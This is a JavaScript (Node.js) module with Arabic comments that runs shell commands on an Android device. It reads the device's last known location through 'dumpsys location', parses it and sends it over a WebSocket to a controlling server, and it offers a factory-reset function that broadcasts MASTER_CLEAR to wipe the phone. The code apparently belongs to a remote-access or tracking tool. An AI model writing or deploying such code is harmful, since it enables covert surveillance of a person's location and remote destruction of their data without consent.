const { exec } = require('child_process');
const fs = require('fs');

class SystemModule {
  async getLocation() {
    try {
      // استخدام خدمات الموقع الداخلية
      const location = await this.executeCommand(
        'dumpsys location | grep "Last Known Locations"'
      );
      
      // تحليل البيانات وإرسالها
      const parsedLocation = this.parseLocation(location);
      
      if (parsedLocation) {
        this.sendToServer('location', parsedLocation);
        return parsedLocation;
      }
      
      return null;
    } catch (error) {
      console.error('فشل في الحصول على الموقع:', error);
      return null;
    }
  }

  async factoryReset() {
    try {
      // تنفيذ إعادة ضبط المصنع
      await this.executeCommand('am broadcast -a android.intent.action.MASTER_CLEAR');
      return true;
    } catch (error) {
      console.error('فشل في إعادة الضبط:', error);
      return false;
    }
  }

  parseLocation(locationData) {
    // تحليل بيانات الموقع الخام
    const regex = /Last Known Locations:\s*\n([\s\S]*?)(?=\n\n)/;
    const match = locationData.match(regex);
    
    if (match && match[1]) {
      const providers = match[1].trim().split('\n');
      
      const result = {};
      providers.forEach(provider => {
        const parts = provider.split(':');
        if (parts.length >= 2) {
          const providerName = parts[0].trim();
          const coords = parts[1].split(',').map(coord => {
            const [key, value] = coord.split('=');
            return { [key.trim()]: parseFloat(value.trim()) };
          });
          
          result[providerName] = Object.assign({}, ...coords);
        }
      });
      
      return result;
    }
    
    return null;
  }

  sendToServer(type, data) {
    // إرسال البيانات للخادم عبر WebSocket
    if (this.controller && this.controller.ws) {
      this.controller.ws.send(JSON.stringify({
        type: type,
        data: data
      }));
    }
  }

  executeCommand(cmd) {
    return new Promise((resolve, reject) => {
      exec(cmd, (error, stdout, stderr) => {
        if (error) reject(error);
        else resolve(stdout);
      });
    });
  }
}

module.exports = SystemModule;